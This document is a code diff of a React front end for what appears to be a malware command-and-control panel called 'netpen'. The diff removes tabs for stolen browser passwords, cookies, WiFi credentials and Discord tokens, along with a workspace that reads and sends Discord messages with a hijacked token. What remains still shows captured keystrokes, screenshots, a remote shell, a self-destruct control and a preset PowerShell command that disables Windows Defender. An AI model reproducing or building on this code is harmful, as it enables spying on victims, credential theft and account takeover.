@@ -1,6 +1,6 @@
 import { useCallback, useEffect, useMemo, useState } from 'react';
-import { Bell, Search, Shield, Activity, Image, Crosshair, TerminalSquare, KeyRound, Cookie, Wifi, MessageSquare, RefreshCw } from 'lucide-react';
-import { discordApi, fetchLatestVersion, proxyFetch, proxySend } from './api.js';
+import { Bell, Search, Shield, Activity, Image, Crosshair, TerminalSquare, RefreshCw } from 'lucide-react';
+import { fetchLatestVersion, proxyFetch, proxySend } from './api.js';
 
 const PAGE_SIZE = 25;
 
@@ -8,11 +8,7 @@ const TABS = [
   { id: 'activity', label: 'LIVE FEED', icon: Activity },
   { id: 'screenshots', label: 'CAPTURES', icon: Image },
   { id: 'triggers', label: 'TRIGGERS', icon: Crosshair },
-  { id: 'shell', label: 'SHELL', icon: TerminalSquare },
-  { id: 'passwords', label: 'PASSWORDS', icon: KeyRound },
-  { id: 'cookies', label: 'COOKIES', icon: Cookie },
-  { id: 'wifi', label: 'WIFI', icon: Wifi },
-  { id: 'discord', label: 'DISCORD', icon: MessageSquare }
+  { id: 'shell', label: 'SHELL', icon: TerminalSquare }
 ];
 
 function cx(...parts) { return parts.filter(Boolean).join(' '); }
@@ -54,11 +50,6 @@ function isSpam(s) {
   return new Set(s).size / s.length < 0.3;
 }
 
-function mask(value) {
-  if (!value) return '(open)';
-  return '•'.repeat(Math.min(20, value.length));
-}
-
 function useAliases() {
   const [aliases, setAliases] = useState(() => {
     try { return JSON.parse(localStorage.getItem('netpen_aliases') || '{}'); } catch { return {}; }
@@ -91,26 +82,12 @@ function App() {
   const [lastPage, setLastPage] = useState(false);
   const [latestVersion, setLatestVersion] = useState(null);
   const [heartbeats, setHeartbeats] = useState([]);
-  const [harvestPaused, setHarvestPaused] = useState(false);
   const [keys, setKeys] = useState([]);
   const [screenshots, setScreenshots] = useState([]);
   const [triggers, setTriggers] = useState([]);
   const [triggerInput, setTriggerInput] = useState('');
   const [shellInput, setShellInput] = useState('');
   const [execResults, setExecResults] = useState([]);
-  const [passwords, setPasswords] = useState([]);
-  const [cookies, setCookies] = useState([]);
-  const [wifiRows, setWifiRows] = useState([]);
-  const [discordRows, setDiscordRows] = useState([]);
-  const [discordToken, setDiscordToken] = useState('');
-  const [guilds, setGuilds] = useState([]);
-  const [guildName, setGuildName] = useState('');
-  const [guildId, setGuildId] = useState('');
-  const [channels, setChannels] = useState([]);
-  const [channelId, setChannelId] = useState('');
-  const [channelName, setChannelName] = useState('');
-  const [messages, setMessages] = useState([]);
-  const [discordMessage, setDiscordMessage] = useState('');
   const [toasts, setToasts] = useState([]);
   const [busy, setBusy] = useState({});
   const [aliasModalHost, setAliasModalHost] = useState('');
@@ -140,13 +117,6 @@ function App() {
     } catch {}
   }, []);
 
-  const fetchHarvest = useCallback(async () => {
-    try {
-      const data = await proxyFetch('/rest/v1/agent_config?key=eq.harvest_paused&select=value');
-      if (data?.length) setHarvestPaused(data[0].value === 'true');
-    } catch {}
-  }, []);
-
   const fetchActivity = useCallback(async (reset = false) => {
     const activePage = reset ? 0 : page;
     if (reset) setPage(0);
@@ -173,62 +143,16 @@ function App() {
     setExecResults(data || []);
   }, []);
 
-  const fetchPasswords = useCallback(async () => {
-    const data = await proxyFetch('/rest/v1/passwords?select=id,created_at,hostname,browser,origin_url,username_value,password_value&order=created_at.desc&limit=100');
-    setPasswords(data || []);
-  }, []);
-
-  const fetchCookies = useCallback(async () => {
-    const data = await proxyFetch('/rest/v1/cookies?select=id,created_at,hostname,browser,domain,name,value&order=created_at.desc&limit=200');
-    setCookies(data || []);
-  }, []);
-
-  const fetchWifi = useCallback(async () => {
-    const data = await proxyFetch('/rest/v1/wifi_creds?select=id,created_at,hostname,ssid,password,security,ipv4&order=created_at.desc&limit=50');
-    setWifiRows(data || []);
-  }, []);
-
-  const fetchDiscordTokens = useCallback(async () => {
-    const data = await proxyFetch('/rest/v1/discord_tokens?select=id,created_at,hostname,token&order=created_at.desc&limit=50');
-    if (!data?.length) {
-      setDiscordRows([]);
-      setDiscordToken('');
-      return;
-    }
-    const rows = await Promise.all(data.map(async (row) => {
-      let valid = false;
-      let userInfo = '';
-      if (row.token) {
-        try {
-          const user = await discordApi(row.token, '/users/@me');
-          valid = true;
-          userInfo = `${user.global_name || user.username || ''}${user.discriminator && user.discriminator !== '0' ? `#${user.discriminator}` : ''}`;
-        } catch {}
-      }
-      return { ...row, valid, userInfo };
-    }));
-    setDiscordRows(rows);
-    if (!discordToken) {
-      const firstValid = rows.find((r) => r.valid)?.token || '';
-      if (firstValid) setDiscordToken(firstValid);
-    }
-  }, [discordToken]);
-
   const refreshTab = useCallback(() => {
     if (tab === 'activity') return fetchActivity();
     if (tab === 'screenshots') return fetchCaptures();
     if (tab === 'triggers') return fetchTriggers();
     if (tab === 'shell') return fetchExec();
-    if (tab === 'passwords') return fetchPasswords();
-    if (tab === 'cookies') return fetchCookies();
-    if (tab === 'wifi') return fetchWifi();
-    if (tab === 'discord') return fetchDiscordTokens();
-  }, [tab, fetchActivity, fetchCaptures, fetchTriggers, fetchExec, fetchPasswords, fetchCookies, fetchWifi, fetchDiscordTokens]);
+  }, [tab, fetchActivity, fetchCaptures, fetchTriggers, fetchExec]);
 
   useEffect(() => {
     fetchLatestVersion().then(setLatestVersion).catch(() => {});
     fetchHeartbeat();
-    fetchHarvest();
     fetchActivity(true).catch(() => {});
     const hb = setInterval(fetchHeartbeat, 10000);
     const refresh = setInterval(() => refreshTab()?.catch?.(() => {}), 20000);
@@ -317,12 +241,6 @@ function App() {
           <Search size={12} color="var(--text-soft)" />
           <input value={globalSearch} onChange={(e) => setGlobalSearch(e.target.value)} placeholder="Search keystrokes, hosts, windows..." />
         </div>
-        <button className="btn btn-green" disabled={busy.harvest} onClick={() => withBusy('harvest', async () => {
-          const next = harvestPaused ? 'false' : 'true';
-          await proxySend('/rest/v1/agent_config?key=eq.harvest_paused', { key: 'harvest_paused', value: next }, 'PUT', { 'x-upsert': 'true' });
-          setHarvestPaused(!harvestPaused);
-          toast(`${harvestPaused ? 'Resumed' : 'Paused'} harvest globally`, 'success');
-        })}>{harvestPaused ? 'RESUME HARVEST' : 'PAUSE HARVEST'}</button>
         <button className="btn btn-red" disabled={busy.stop} onClick={() => withBusy('stop', () => sendControl('stop', {}, `Stop sent to ${selectedHost}`))}>STOP</button>
         <button className="btn btn-red" disabled={busy.selfdestruct} onClick={() => {
           if (!selectedHost) return toast('Select a device first', 'error');
@@ -479,7 +397,6 @@ function App() {
                     <button className="btn btn-amber" onClick={() => setShellInput('shutdown /r /t 0')}>RESTART</button>
                     <button className="btn" onClick={() => setShellInput('rundll32.exe user32.dll,LockWorkStation')}>LOCK</button>
                     <button className="btn btn-blue" onClick={() => { const url = window.prompt('Enter URL to open:'); if (url?.trim()) setShellInput(`start "" "${url.trim()}"`); }}>OPEN URL</button>
-                    <button className="btn" onClick={() => withBusy('wifi', () => sendControl('wifi', {}, `WiFi harvest triggered for ${selectedHost}`))}>WIFI DUMP</button>
                     <button className="btn btn-red" onClick={() => setShellInput('powershell -c "Set-MpPreference -DisableRealtimeMonitoring $true; Set-MpPreference -DisableIOAVProtection $true"')}>DISABLE DEFENDER</button>
                     <button className="btn" onClick={() => setShellInput('systeminfo | findstr /B /C:"OS Name" /C:"System Boot Time" /C:"Total Physical Memory"')}>SYS INFO</button>
                   </div>
@@ -489,25 +406,6 @@ function App() {
                   </div>
                   <div className="table-wrap"><table><thead><tr><th>TIME</th><th>HOST</th><th>COMMAND</th><th>OUTPUT</th></tr></thead><tbody>{scoped(execResults).length === 0 ? <tr><td colSpan="4" className="empty">No commands executed yet.</td></tr> : scoped(execResults).map((row) => <tr key={row.id}><td>{formatDate(row.created_at)}</td><td>{displayHost(row.hostname, aliases)}</td><td className="mono">$ {row.command}</td><td><div className="mono tiny" style={{ color: row.exit_code === 0 ? 'var(--green)' : 'var(--red)', marginBottom: 6 }}>exit {row.exit_code}</div><details><summary>toggle output</summary><pre className="code" style={{ whiteSpace: 'pre-wrap' }}>{row.output}</pre></details></td></tr>)}</tbody></table></div>
                 </div>
-              </div>
-            )}
-
-            {tab === 'passwords' && (
-              <div className="panel"><div className="panel-header"><span className="panel-title">BROWSER PASSWORDS</span></div><div className="panel-body"><div className="table-wrap"><table><thead><tr><th>TIME</th><th>HOST</th><th>BROWSER</th><th>SITE</th><th>USERNAME</th><th>PASSWORD</th></tr></thead><tbody>{scoped(passwords).length === 0 ? <tr><td colSpan="6" className="empty">No passwords harvested yet.</td></tr> : scoped(passwords).map((row) => <PasswordRow key={row.id} row={row} aliases={aliases} />)}</tbody></table></div></div></div>
-            )}
-
-            {tab === 'cookies' && (
-              <div className="panel"><div className="panel-header"><span className="panel-title">BROWSER COOKIES</span></div><div className="panel-body"><div className="table-wrap"><table><thead><tr><th>TIME</th><th>HOST</th><th>BROWSER</th><th>DOMAIN</th><th>NAME</th><th>VALUE</th></tr></thead><tbody>{scoped(cookies).length === 0 ? <tr><td colSpan="6" className="empty">No cookies harvested yet.</td></tr> : scoped(cookies).map((row) => <CookieRow key={row.id} row={row} aliases={aliases} toast={toast} />)}</tbody></table></div></div></div>
-            )}
-
-            {tab === 'wifi' && (
-              <div className="panel"><div className="panel-header"><span className="panel-title">WIFI CREDENTIALS</span></div><div className="panel-body"><div className="table-wrap"><table><thead><tr><th>TIME</th><th>HOST</th><th>SSID</th><th>PASSWORD</th><th>SECURITY</th><th>IP</th></tr></thead><tbody>{scoped(wifiRows).length === 0 ? <tr><td colSpan="6" className="empty">No WiFi credentials harvested yet.</td></tr> : scoped(wifiRows).map((row) => <WifiRow key={row.id} row={row} aliases={aliases} />)}</tbody></table></div></div></div>
-            )}
-
-            {tab === 'discord' && (
-              <div className="grid" style={{ gap: 16 }}>
-                <div className="panel"><div className="panel-header"><span className="panel-title">DISCORD TOKENS</span><button className="btn btn-green" disabled={busy.forceDiscord} onClick={() => withBusy('forceDiscord', () => sendControl('force_discord', {}, `Discord harvest triggered for ${selectedHost}`))}>FORCE HARVEST</button></div><div className="panel-body"><div className="table-wrap"><table><thead><tr><th>TIME</th><th>HOST</th><th>TOKEN</th><th>ACTION</th></tr></thead><tbody>{scoped(discordRows).length === 0 ? <tr><td colSpan="4" className="empty">No Discord tokens found yet.</td></tr> : scoped(discordRows).map((row) => <DiscordTokenRow key={row.id} row={row} aliases={aliases} setDiscordToken={setDiscordToken} toast={toast} />)}</tbody></table></div></div></div>
-                <div className="panel"><div className="panel-header"><span className="panel-title">DISCORD WORKSPACE</span><div className="muted tiny">{discordToken ? `Token loaded (${discordToken.slice(0, 10)}...)` : 'Select a token first'}</div></div><div className="panel-body"><div className="action-row" style={{ marginBottom: 14 }}><button className="btn btn-blue" disabled={!discordToken || busy.guilds} onClick={() => withBusy('guilds', async () => { const data = await discordApi(discordToken, '/users/@me/guilds'); setGuilds(data || []); setChannels([]); setMessages([]); setGuildId(''); setGuildName(''); setChannelId(''); setChannelName(''); })}>LIST SERVERS</button></div><div className="discord-layout"><div className="panel"><div className="panel-header"><span className="panel-title">SERVERS</span></div><div className="listbox">{guilds.length === 0 ? <div className="empty">Click list servers.</div> : guilds.map((g) => <div key={g.id} className={cx('listitem', guildId === g.id && 'active')} onClick={() => withBusy(`guild-${g.id}`, async () => { setGuildId(g.id); setGuildName(g.name); const data = await discordApi(discordToken, `/guilds/${g.id}/channels`); setChannels((data || []).filter((c) => c.type === 0)); setMessages([]); setChannelId(''); setChannelName(''); })}>{g.name}</div>)}</div></div><div className="panel"><div className="panel-header"><span className="panel-title">{guildName || 'CHANNELS'}</span></div><div className="listbox">{channels.length === 0 ? <div className="empty">Select a server.</div> : channels.map((c) => <div key={c.id} className={cx('listitem', channelId === c.id && 'active')} onClick={() => withBusy(`channel-${c.id}`, async () => { setChannelId(c.id); setChannelName(c.name); const data = await discordApi(discordToken, `/channels/${c.id}/messages?limit=25`); setMessages((data || []).slice().reverse()); })}># {c.name}</div>)}</div></div><div className="panel"><div className="panel-header"><span className="panel-title">{channelName ? `# ${channelName}` : 'MESSAGES'}</span></div><div className="panel-body"><div className="messages">{messages.length === 0 ? <div className="empty">Select a channel.</div> : messages.map((m) => <div key={m.id} className="message"><div style={{ marginBottom: 6 }}><strong style={{ color: 'var(--green)' }}>{m.author?.global_name || m.author?.username || 'unknown'}</strong> <span className="mono tiny muted">{m.timestamp ? new Date(m.timestamp).toLocaleTimeString() : ''}</span></div><div style={{ fontSize: 12, whiteSpace: 'pre-wrap' }}>{m.content}</div>{m.attachments?.map((a) => <div key={a.id || a.url} style={{ marginTop: 6 }}><a href={a.url} target="_blank" rel="noreferrer">[{a.filename}]</a></div>)}</div>)}</div><div className="toolbar" style={{ marginTop: 14 }}><input className="input" style={{ flex: 1 }} value={discordMessage} onChange={(e) => setDiscordMessage(e.target.value)} onKeyDown={(e) => e.key === 'Enter' && withBusy('sendDiscord', async () => { if (!channelId || !discordMessage.trim()) return; await discordApi(discordToken, `/channels/${channelId}/messages`, { method: 'POST', body: JSON.stringify({ content: discordMessage.trim() }) }); setDiscordMessage(''); const data = await discordApi(discordToken, `/channels/${channelId}/messages?limit=25`); setMessages((data || []).slice().reverse()); toast('Message sent', 'success'); })} placeholder="Type a message..." /><button className="btn btn-green" disabled={!channelId || busy.sendDiscord} onClick={() => withBusy('sendDiscord', async () => { if (!channelId || !discordMessage.trim()) return; await discordApi(discordToken, `/channels/${channelId}/messages`, { method: 'POST', body: JSON.stringify({ content: discordMessage.trim() }) }); setDiscordMessage(''); const data = await discordApi(discordToken, `/channels/${channelId}/messages?limit=25`); setMessages((data || []).slice().reverse()); toast('Message sent', 'success'); })}>SEND</button></div></div></div></div></div></div>
               </div>
             )}
           </div>
@@ -526,28 +424,6 @@ function App() {
       {aliasModalHost && <div className="modal-backdrop" onClick={() => setAliasModalHost('')}><div className="panel modal" onClick={(e) => e.stopPropagation()}><div className="panel-header"><span className="panel-title">RENAME DEVICE</span></div><div className="panel-body"><div className="muted" style={{ marginBottom: 12 }}>{aliasModalHost}</div><input className="input" style={{ width: '100%' }} value={aliasDraft} onChange={(e) => setAliasDraft(e.target.value)} placeholder="Friendly name..." /><div className="toolbar" style={{ marginTop: 14 }}><button className="btn btn-green" onClick={updateAlias}>SAVE</button><button className="btn" onClick={() => { setAliasModalHost(''); setAliasDraft(''); }}>CANCEL</button></div></div></div></div>}
     </div>
   );
-}
-
-function PasswordRow({ row, aliases }) {
-  const [revealed, setRevealed] = useState(false);
-  const favicon = `https://www.google.com/s2/favicons?domain=${encodeURIComponent(row.origin_url || '')}&sz=16`;
-  return <tr><td>{formatDate(row.created_at)}</td><td>{displayHost(row.hostname, aliases)}</td><td><span className="badge">{row.browser}</span></td><td><img src={favicon} alt="" style={{ width: 16, height: 16, marginRight: 6, verticalAlign: 'middle' }} /><span>{row.origin_url}</span></td><td className="mono">{row.username_value}</td><td><button className="btn" onClick={() => setRevealed((v) => !v)}>{revealed ? row.password_value : mask(row.password_value)}</button></td></tr>;
-}
-
-function CookieRow({ row, aliases, toast }) {
-  const isHarvest = row.domain === '[HARVEST]';
-  return <tr><td>{formatDate(row.created_at)}</td><td>{displayHost(row.hostname, aliases)}</td><td><span className="badge">{row.browser}</span></td><td>{row.domain}</td><td className="mono">{row.name}</td><td>{isHarvest ? row.value : <button className="btn" onClick={async () => { await navigator.clipboard.writeText(row.value || ''); toast('Cookie copied', 'success'); }}>COPY</button>}</td></tr>;
-}
-
-function WifiRow({ row, aliases }) {
-  const [revealed, setRevealed] = useState(false);
-  return <tr><td>{formatDate(row.created_at)}</td><td>{displayHost(row.hostname, aliases)}</td><td>{row.ssid}</td><td><button className="btn" onClick={() => setRevealed((v) => !v)}>{row.password ? (revealed ? row.password : mask(row.password)) : '(open)'}</button></td><td><span className="badge">{row.security}</span></td><td className="mono">{row.ipv4}</td></tr>;
-}
-
-function DiscordTokenRow({ row, aliases, setDiscordToken, toast }) {
-  const [revealed, setRevealed] = useState(false);
-  const masked = row.token?.length > 20 ? `${row.token.slice(0, 10)}${'•'.repeat(18)}${row.token.slice(-5)}` : mask(row.token || '');
-  return <tr><td>{formatDate(row.created_at)}</td><td>{displayHost(row.hostname, aliases)}</td><td className="code"><button className="btn" onClick={() => setRevealed((v) => !v)} style={{ marginRight: 8 }}>{revealed ? row.token : masked}</button>{row.valid ? <span className="badge" style={{ color: 'var(--green)' }}>{row.userInfo || 'VALID'}</span> : <span className="badge" style={{ color: 'var(--red)' }}>INVALID</span>}</td><td>{row.valid && <div className="toolbar"><button className="btn" onClick={async () => { await navigator.clipboard.writeText(row.token || ''); toast('Token copied', 'success'); }}>COPY</button><button className="btn btn-purple" onClick={() => { setDiscordToken(row.token); toast('Selected token', 'success'); }}>USE</button></div>}</td></tr>;
 }
 
 export default App;
